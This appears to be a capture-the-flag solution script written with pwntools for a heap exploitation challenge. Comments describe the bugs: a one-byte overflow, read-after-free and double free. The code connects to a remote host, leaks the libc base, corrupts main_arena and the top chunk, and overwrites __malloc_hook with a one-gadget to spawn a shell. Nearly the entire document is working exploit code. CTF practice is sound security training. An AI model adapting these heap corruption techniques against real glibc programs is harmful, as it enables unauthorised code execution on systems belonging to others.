#!/ur/bin/env python3

#The chall has 2 bugs one is single byte overflow and the other is read after free and then double free
#The constraints are only one huge chunk and then 0x30 and 0x40 sized chunks available to malloc 
#We can't use tcache based attacks bcoz those are filled and calloc used here will not take chunks from tcachebin and nulls out the memory
#And without 0x70 chunk we can't make a fastbin dup attack on the malloc_hook
#Using the Read after free by creating two handles to the huge malloc chunk and the small calloc chunk i was able to get libc leak
#Here i was able to create a fake size chunk in the main arena using a double free and then inturn to place a chunk there to tamper the top chunk pointer
#And finally malloc a chunk from the new top chunk to tamper the malloc hook with one gadget..

from pwn import *


e = ELF("./once_and_for_all_patched")
libc = ELF("./libc.so.6")
#r = process("./once_and_for_all_patched")
r = remote("138.68.188.223",31930)

def malloc(index,size,data):
    r.sendlineafter(b">>",b"1")
    r.sendlineafter(b"index:",f"{index}")
    r.sendlineafter(b"How much space do you need for it:",f"{size}")
    r.sendafter(b"Input your weapon's details:",data)


def free(index,size,data):
    r.sendlineafter(b">>",b"2")
    r.sendlineafter(b"index:",f"{index}")
    r.sendlineafter(b"How much space do you need for this repair:",f"{size}")
    if(size <= 56):
        r.sendafter(b"Input your weapon's details:",data)
        r.sendlineafter(b">>",b"2")

def rce():
    r.sendlineafter(b">>",b"2")
    r.sendlineafter(b"index:",b"0")
    r.sendlineafter(b"How much space do you need for this repair:",b"56")

def show(index):
    r.sendlineafter(b">>",b"3")
    r.sendlineafter(b"index:",f"{index}")
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return leak

def huge_malloc(size):
    r.sendlineafter(b">>",b"4")
    r.sendlineafter(b"massive",f"{size}")



malloc(0,56,b"A"  * 40)
free(0,100,b"A")
huge_malloc(2000)
malloc(1,56,b"B" *  40)
free(0,100,b"A")
libc_base = show(0) - 0x3ebca0
log.info("The libc base of the process is " + hex(libc_base))
malloc(2,40,b"C" * 40)
malloc(3,40,b"D" * 40)
free(2,100,b"C")
free(3,100,b"D")
free(2,40,p64(0x41))
malloc(4,40,b"E" * 8)
malloc(5,40,b"F" * 8)
malloc(6,56,b"G" * 8)
malloc(7,56,b"H" * 8)
free(6,100,b"G")
free(7,100,b"H")
free(6,56,p64(libc_base + 0x3ebc50))
malloc(8,56,b"I" * 8)
malloc(9,56,b"J" * 8)
malloc(10,56,p64(libc_base + 0x3ebc80) +  p64(0) * 4 + p64(0x41))
malloc(11,56,p64(0) * 2 + p64(libc_base + libc.sym.__malloc_hook - 0x28) + p64(0) + p64(libc_base + 0x3ebca0) * 2 + p64(libc_base + 0x3ebcb0))
malloc(12,56,b"A" * 8+  p64(libc_base + 0x4f322) + p64(libc_base + libc.sym.memalign) + p64(libc_base + libc.sym.realloc))
rce()
r.interactive()
